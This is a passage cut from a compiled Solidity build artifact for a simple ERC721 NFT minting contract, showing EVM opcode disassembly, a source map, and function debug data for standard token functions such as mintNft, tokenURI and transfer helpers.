JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x19BF JUMPI PUSH2 0x19BE PUSH2 0x217F JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x19CD DUP5 DUP3 DUP6 ADD PUSH2 0x1779 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x19EC JUMPI PUSH2 0x19EB PUSH2 0x217F JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x19FA DUP5 DUP3 DUP6 ADD PUSH2 0x178E JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x1A19 JUMPI PUSH2 0x1A18 PUSH2 0x217F JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x1A27 DUP5 DUP3 DUP6 ADD PUSH2 0x17D1 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x1A39 DUP2 PUSH2 0x1FCA JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x1A48 DUP2 PUSH2 0x1FDC JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1A59 DUP3 PUSH2 0x1F08 JUMP JUMPDEST PUSH2 0x1A63 DUP2 DUP6 PUSH2 0x1F1E JUMP JUMPDEST SWAP4 POP PUSH2 0x1A73 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x204D JUMP JUMPDEST PUSH2 0x1A7C DUP2 PUSH2 0x2184 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1A92 DUP3 PUSH2 0x1F13 JUMP JUMPDEST PUSH2 0x1A9C DUP2 DUP6 PUSH2 0x1F2F JUMP JUMPDEST SWAP4 POP PUSH2 0x1AAC DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x204D JUMP JUMPDEST PUSH2 0x1AB5 DUP2 PUSH2 0x2184 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1ACD PUSH1 0x2D DUP4 PUSH2 0x1F2F JUMP JUMPDEST SWAP2 POP PUSH2 0x1AD8 DUP3 PUSH2 0x2195 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1AF0 PUSH1 0x32 DUP4 PUSH2 0x1F2F JUMP JUMPDEST SWAP2 POP PUSH2 0x1AFB DUP3 PUSH2 0x21E4 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1B13 PUSH1 0x25 DUP4 PUSH2 0x1F2F JUMP JUMPDEST SWAP2 POP PUSH2 0x1B1E DUP3 PUSH2 0x2233 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1B36 PUSH1 0x1C DUP4 PUSH2 0x1F2F JUMP JUMPDEST SWAP2 POP PUSH2 0x1B41 DUP3 PUSH2 0x2282 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1B59 PUSH1 0x24 DUP4 PUSH2 0x1F2F JUMP JUMPDEST SWAP2 POP PUSH2 0x1B64 DUP3 PUSH2 0x22AB JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1B7C PUSH1 0x19 DUP4 PUSH2 0x1F2F JUMP JUMPDEST SWAP2 POP PUSH2 0x1B87 DUP3 PUSH2 0x22FA JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1B9F PUSH1 0x29 DUP4 PUSH2 0x1F2F JUMP JUMPDEST SWAP2 POP PUSH2 0x1BAA DUP3 PUSH2 0x2323 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1BC2 PUSH1 0x20 DUP4 PUSH2 0x1F2F JUMP JUMPDEST SWAP2 POP PUSH2 0x1BCD DUP3 PUSH2 0x2372 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1BE5 PUSH1 0x18 DUP4 PUSH2 0x1F2F JUMP JUMPDEST SWAP2 POP PUSH2 0x1BF0 DUP3 PUSH2 0x239B JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1C08 PUSH1 0x21 DUP4 PUSH2 0x1F2F JUMP JUMPDEST SWAP2 POP PUSH2 0x1C13 DUP3 PUSH2 0x23C4 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1C2B PUSH1 0x3D DUP4 PUSH2 0x1F2F JUMP JUMPDEST SWAP2 POP PUSH2 0x1C36 DUP3 PUSH2 0x2413 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1C4E PUSH1 0x30 DUP4 PUSH2 0x1F2F JUMP JUMPDEST SWAP2 POP PUSH2 0x1C59 DUP3 PUSH2 0x2462 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1C6D DUP2 PUSH2 0x2034 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1C88 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1A30 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x80 DUP3 ADD SWAP1 POP PUSH2 0x1CA3 PUSH1 0x0 DUP4 ADD DUP8 PUSH2 0x1A30 JUMP JUMPDEST PUSH2 0x1CB0 PUSH1 0x20 DUP4 ADD DUP7 PUSH2 0x1A30 JUMP JUMPDEST PUSH2 0x1CBD PUSH1 0x40 DUP4 ADD DUP6 PUSH2 0x1C64 JUMP JUMPDEST DUP2 DUP2 SUB PUSH1 0x60 DUP4 ADD MSTORE PUSH2 0x1CCF DUP2 DUP5 PUSH2 0x1A4E JUMP JUMPDEST SWAP1 POP SWAP6 SWAP5 POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1CEF PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1A3F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1D0F DUP2 DUP5 PUSH2 0x1A87 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1D30 DUP2 PUSH2 0x1AC0 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1D50 DUP2 PUSH2 0x1AE3 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1D70 DUP2 PUSH2 0x1B06 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1D90 DUP2 PUSH2 0x1B29 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1DB0 DUP2 PUSH2 0x1B4C JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1DD0 DUP2 PUSH2 0x1B6F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1DF0 DUP2 PUSH2 0x1B92 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1E10 DUP2 PUSH2 0x1BB5 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1E30 DUP2 PUSH2 0x1BD8 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1E50 DUP2 PUSH2 0x1BFB JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1E70 DUP2 PUSH2 0x1C1E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1E90 DUP2 PUSH2 0x1C41 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1EAC PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1C64 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1EBC PUSH2 0x1ECD JUMP JUMPDEST SWAP1 POP PUSH2 0x1EC8 DUP3 DUP3 PUSH2 0x20B2 JUMP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT ISZERO PUSH2 0x1EF2 JUMPI PUSH2 0x1EF1 PUSH2 0x2141 JUMP JUMPDEST JUMPDEST PUSH2 0x1EFB DUP3 PUSH2 0x2184 JUMP JUMPDEST SWAP1 POP PUSH1 0x20 DUP2 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1F4B DUP3 PUSH2 0x2034 JUMP JUMPDEST SWAP2 POP PUSH2 0x1F56 DUP4 PUSH2 0x2034 JUMP JUMPDEST SWAP3 POP DUP3 PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SUB DUP3 GT ISZERO PUSH2 0x1F8B JUMPI PUSH2 0x1F8A PUSH2 0x20E3 JUMP JUMPDEST JUMPDEST DUP3 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1FA1 DUP3 PUSH2 0x2034 JUMP JUMPDEST SWAP2 POP PUSH2 0x1FAC DUP4 PUSH2 0x2034 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x1FBF JUMPI PUSH2 0x1FBE PUSH2 0x20E3 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1FD5 DUP3 PUSH2 0x2014 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH32 0xFFFFFFFF00000000000000000000000000000000000000000000000000000000 DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST DUP3 DUP2 DUP4 CALLDATACOPY PUSH1 0x0 DUP4 DUP4 ADD MSTORE POP POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x206B JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x2050 JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH2 0x207A JUMPI PUSH1 0x0 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 DUP3 DIV SWAP1 POP PUSH1 0x1 DUP3 AND DUP1 PUSH2 0x2098 JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 EQ ISZERO PUSH2 0x20AC JUMPI PUSH2 0x20AB PUSH2 0x2112 JUMP JUMPDEST JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x20BB DUP3 PUSH2 0x2184 JUMP JUMPDEST DUP2 ADD DUP2 DUP2 LT PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT OR ISZERO PUSH2 0x20DA JUMPI PUSH2 0x20D9 PUSH2 0x2141 JUMP JUMPDEST JUMPDEST DUP1 PUSH1 0x40 MSTORE POP POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4552433732313A2063616C6C6572206973206E6F7420746F6B656E206F776E65 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x72206F7220617070726F76656400000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A207472616E7366657220746F206E6F6E204552433732315265 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x63656976657220696D706C656D656E7465720000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A207472616E736665722066726F6D20696E636F727265637420 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x6F776E6572000000000000000000000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A20746F6B656E20616C7265616479206D696E74656400000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A207472616E7366657220746F20746865207A65726F20616464 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x7265737300000000000000000000000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A20617070726F766520746F2063616C6C657200000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A2061646472657373207A65726F206973206E6F742061207661 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x6C6964206F776E65720000000000000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A206D696E7420746F20746865207A65726F2061646472657373 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A20696E76616C696420746F6B656E2049440000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A20617070726F76616C20746F2063757272656E74206F776E65 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x7200000000000000000000000000000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A20617070726F76652063616C6C6572206973206E6F7420746F PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x6B656E206F776E6572206F7220617070726F76656420666F7220616C6C000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x455243373231204D657461646174613A2055524920717565727920666F72206E PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x6F6E6578697374656E7420746F6B656E00000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH2 0x24BA DUP2 PUSH2 0x1FCA JUMP JUMPDEST DUP2 EQ PUSH2 0x24C5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x24D1 DUP2 PUSH2 0x1FDC JUMP JUMPDEST DUP2 EQ PUSH2 0x24DC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x24E8 DUP2 PUSH2 0x1FE8 JUMP JUMPDEST DUP2 EQ PUSH2 0x24F3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x24FF DUP2 PUSH2 0x2034 JUMP JUMPDEST DUP2 EQ PUSH2 0x250A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID PUSH10 0x7066733A2F2F62616679 PUSH3 0x656967 CALLER CALLDATACOPY PUSH10 0x6F6972373673376D6735 PUSH16 0x6F6265746E636F6A636D336333687861 PUSH20 0x79643472766964346A71687934676B6168656734 0x2F EXTCODEHASH PUSH7 0x696C656E616D65 RETURNDATASIZE ADDRESS 0x2D POP SSTORE SELFBALANCE 0x2E PUSH11 0x736F6EA264697066735822 SLT KECCAK256 CALLVALUE 0xB9 0xC4 JUMP DUP16 SLT ADDRESS 0xB8 MOD DUP12 0xA9 0xA8 DUP10 0xC6 ISZERO PUSH27 0x30591E0E253FB57B890CFE09B3CC565164736F6C63430008070033 ","sourceMap":"116:855:13:-:0;;;371:72;;;;;;;;;;1390:113:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1464:5;1456;:13;;;;;;;;;;;;:::i;:::-;;1489:7;1479;:17;;;;;;;;;;;;:::i;:::-;;1390:113;;435:1:13::1;418:14;:18;;;;116:855:::0;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;:::o;:::-;;;;;;;;;;;;;;;;;;;;;:::o;7:320:15:-;51:6;88:1;82:4;78:12;68:22;;135:1;129:4;125:12;156:18;146:81;;212:4;204:6;200:17;190:27;;146:81;274:2;266:6;263:14;243:18;240:38;237:84;;;293:18;;:::i;:::-;237:84;58:269;7:320;;;:::o;333:180::-;381:77;378:1;371:88;478:4;475:1;468:15;502:4;499:1;492:15;116:855:13;;;;;;;"},"deployedBytecode":{"functionDebugData":{"@TOKEN_URI_3203":{"entryPoint":1998,"id":3203,"parameterSlots":0,"returnSlots":0},"@_afterTokenTransfer_997":{"entryPoint":4820,"id":997,"parameterSlots":4,"returnSlots":0},"@_approve_830":{"entryPoint":2817,"id":830,"parameterSlots":2,"returnSlots":0},"@_beforeTokenTransfer_984":{"entryPoint":4526,"id":984,"parameterSlots":4,"returnSlots":0},"@_checkOnERC721Received_938":{"entryPoint":4826,"id":938,"parameterSlots":4,"returnSlots":1},"@_exists_499":{"entryPoint":4461,"id":499,"parameterSlots":1,"returnSlots":1},"@_isApprovedOrOwner_533":{"entryPoint":3002,"id":533,"parameterSlots":2,"returnSlots":1},"@_mint_654":{"entryPoint":5359,"id":654,"parameterSlots":2,"returnSlots":0},"@_msgSender_1501":{"entryPoint":2809,"id":1501,"parameterSlots":0,"returnSlots":1},"@_ownerOf_481":{"entryPoint":3913,"id":481,"parameterSlots":1,"returnSlots":1},"@_requireMinted_876":{"entryPoint":2734,"id":876,"parameterSlots":1,"returnSlots":0},"@_safeMint_548":{"entryPoint":4431,"id":548,"parameterSlots":2,"returnSlots":0},"@_safeMint_577":{"entryPoint":5233,"id":577,"parameterSlots":3,"returnSlots":0},"@_safeTransfer_468":{"entryPoint":4339,"id":468,"parameterSlots":4,"returnSlots":0},"@_setApprovalForAll_862":{"entryPoint":3974,"id":862,"parameterSlots":3,"returnSlots":0},"@_transfer_806":{"entryPoint":3151,"id":806,"parameterSlots":3,"returnSlots":0},"@approve_310":{"entryPoint":1261,"id":310,"parameterSlots":2,"returnSlots":0},"@balanceOf_171":{"entryPoint":1814,"id":171,"parameterSlots":1,"returnSlots":1},"@getApproved_328":{"entryPoint":1191,"id":328,"parameterSlots":1,"returnSlots":1},"@getTokenCounter_3267":{"entryPoint":1804,"id":3267,"parameterSlots":0,"returnSlots":1},"@isApprovedForAll_363":{"entryPoint":2480,"id":363,"parameterSlots":2,"returnSlots":1},"@isContract_1177":{"entryPoint":5324,"id":1177,"parameterSlots":1,"returnSlots":1},"@mintNft_3241":{"entryPoint":2292,"id":3241,"parameterSlots":0,"returnSlots":0},"@name_209":{"entryPoint":1045,"id":209,"parameterSlots":0,"returnSlots":1},"@ownerOf_199":{"entryPoint":1669,"id":199,"parameterSlots":1,"returnSlots":1},"@safeTransferFrom_409":{"entryPoint":1637,"id":409,"parameterSlots":3,"returnSlots":0},"@safeTransferFrom_439":{"entryPoint":2194,"id":439,"parameterSlots":4,"returnSlots":0},"@setApprovalForAll_345":{"entryPoint":2172,"id":345,"parameterSlots":2,"returnSlots":0},"@supportsInterface_147":{"entryPoint":819,"id":147,"parameterSlots":1,"returnSlots":1},"@supportsInterface_1709":{"entryPoint":2628,"id":1709,"parameterSlots":1,"returnSlots":1},"@symbol_219":{"entryPoint":2026,"id":219,"parameterSlots":0,"returnSlots":1},"@tokenURI_3259":{"entryPoint":2374,"id":3259,"parameterSlots":1,"returnSlots":1},"@transferFrom_390":{"entryPoint":1541,"id":390,"parameterSlots":3,"returnSlots":0},"abi_decode_available_length_t_bytes_memory_ptr":{"entryPoint":5901,"id":null,"parameterSlots":3,"returnSlots":1},"abi_decode_t_address":{"entryPoint":5967,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_t_bool":{"entryPoint":5988,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_t_bytes4":{"entryPoint":6009,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_t_bytes4_fromMemory":{"entryPoint":6030,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_t_bytes_memory_ptr":{"entryPoint":6051,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_t_uint256":{"entryPoint":6097,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_address":{"entryPoint":6118,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_addresst_address":{"entryPoint":6163,"id":null,"parameterSlots":2,"returnSlots":2},"abi_decode_tuple_t_addresst_addresst_uint256":{"entryPoint":6227,"id":null,"parameterSlots":2,"returnSlots":3},"abi_decode_tuple_t_addresst_addresst_uint256t_bytes_memory_ptr":{"entryPoint":6310,"id":null,"parameterSlots":2,"returnSlots":4},"abi_decode_tuple_t_addresst_bool":{"entryPoint":6441,"id":null,"parameterSlots":2,"returnSlots":2},"abi_decode_tuple_t_addresst_uint256":{"entryPoint":6505,"id":null,"parameterSlots":2,"returnSlots":2},"abi_decode_tuple_t_bytes4":{"entryPoint":6569,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_bytes4_fromMemory":{"entryPoint":6614,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_uint256":{"entryPoint":6659,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_t_address_to_t_address_fromStack":{"entryPoint":6704,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_t_bool_to_t_bool_fromStack":{"entryPoint":6719,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_fromStack":{"entryPoint":6734,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack":{"entryPoint":6791,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af_to_t_string_memory_ptr_fromStack":{"entryPoint":6848,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e_to_t_string_memory_ptr_fromStack":{"entryPoint":6883,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48_to_t_string_memory_ptr_fromStack":{"entryPoint":6918,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57_to_t_string_memory_ptr_fromStack":{"entryPoint":6953,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4_to_t_string_memory_ptr_fromStack":{"entryPoint":6988,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05_to_t_string_memory_ptr_fromStack":{"entryPoint":7023,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159_to_t_string_memory_ptr_fromStack":{"entryPoint":7058,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6_to_t_string_memory_ptr_fromStack":{"entryPoint":7093,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f_to_t_string_memory_ptr_fromStack":{"entryPoint":7128,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942_to_t_string_memory_ptr_fromStack":{"entryPoint":7163,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83_to_t_string_memo